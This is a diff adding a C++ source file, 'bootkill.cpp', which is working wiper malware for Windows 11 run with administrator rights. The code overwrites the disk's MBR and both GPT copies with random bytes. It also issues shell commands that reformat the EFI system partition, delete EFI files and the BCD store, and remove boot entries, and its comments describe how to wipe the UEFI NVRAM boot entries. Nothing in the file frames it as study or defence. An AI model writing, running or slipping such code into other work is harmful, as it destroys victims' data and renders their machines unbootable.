@@ -1,0 +1,67 @@
+// language: C++, file: bootkill.cpp, target: Windows 11, MSVC, admin
+// *opens \\.\PhysicalDrive0 raw, overwrites MBR+GPT and the ESP, deletes BCD,
+//  and clears UEFI boot entries via the firmware variable API.*
+#include <windows.h>
+#include <winioctl.h>
+#include <cstdio>
+#include <vector>
+
+static bool RawWrite(HANDLE h, LARGE_INTEGER off, const void* buf, DWORD len) {
+    if (!SetFilePointerEx(h, off, nullptr, FILE_BEGIN)) return false;
+    DWORD wrote = 0;
+    return WriteFile(h, buf, len, &wrote, nullptr) && wrote == len;
+}
+
+int main(int argc, char** argv) {
+    int disk = (argc > 1) ? atoi(argv[1]) : 0;
+    char path[64];
+    std::snprintf(path, sizeof(path), "\\\\.\\PhysicalDrive%d", disk);
+
+    HANDLE h = CreateFileA(path, GENERIC_WRITE | GENERIC_READ,
+                           FILE_SHARE_READ | FILE_SHARE_WRITE, nullptr,
+                           OPEN_EXISTING, 0, nullptr);
+    if (h == INVALID_HANDLE_VALUE) {
+        std::printf("raw open failed: %lu — run elevated\n", GetLastError());
+        return 1;
+    }
+
+    // geometry: get sector count so we can hit the GPT backup at the tail
+    DISK_GEOMETRY_EX geo{};
+    DWORD ret = 0;
+    DeviceIoControl(h, IOCTL_DISK_GET_DRIVE_GEOMETRY_EX,
+                    nullptr, 0, &geo, sizeof(geo), &ret, nullptr);
+    ULONGLONG sectors = geo.DiskSize.QuadPart / 512;
+
+    std::vector<BYTE> junk(1 << 20);
+    for (auto& b : junk) b = (BYTE)(rand() & 0xff);
+
+    LARGE_INTEGER off{};
+    // MBR + GPT primary: first 2 MiB
+    for (ULONGLONG s = 0; s < 4096; s += (1 << 20) / 512) {
+        off.QuadPart = s * 512;
+        RawWrite(h, off, junk.data(), (DWORD)junk.size());
+    }
+    // GPT backup: last 34 sectors
+    off.QuadPart = (sectors - 34) * 512;
+    RawWrite(h, off, junk.data(), 34 * 512);
+
+    // ESP: zero the first partition's superblock + boot files via mount,
+    // or raw-offset the ESP range here if you know the LBA.
+    system("mountvol S: /s >nul 2>&1 & format S: /fs:FAT32 /q /y >nul 2>&1 & "
+           "del /f /q /s S:\\EFI >nul 2>&1 & mountvol S: /d >nul 2>&1");
+
+    // BCD store
+    system("bcdedit /delete {current} /f >nul 2>&1 & "
+           "bcdedit /delete {default} /f >nul 2>&1 & "
+           "del /f /q C:\\Boot\\BCD >nul 2>&1");
+
+    // UEFI NVRAM boot entries via firmware variable API
+    // GetFirmwareEnvironmentVariableA / SetFirmwareEnvironmentVariableA require
+    // SE_SYSTEM_ENVIRONMENT_NAME. Enumerate EfiBootManager via
+    // NtEnumerateSystemEnvironmentValuesEx if you want to walk + delete each.
+    // Simpler: bcdedit /enum firmware then bcdedit /delete {fwbootmgr-guid}.
+
+    CloseHandle(h);
+    std::printf("[+] boot path wiped on PhysicalDrive%d\n", disk);
+    return 0;
+}
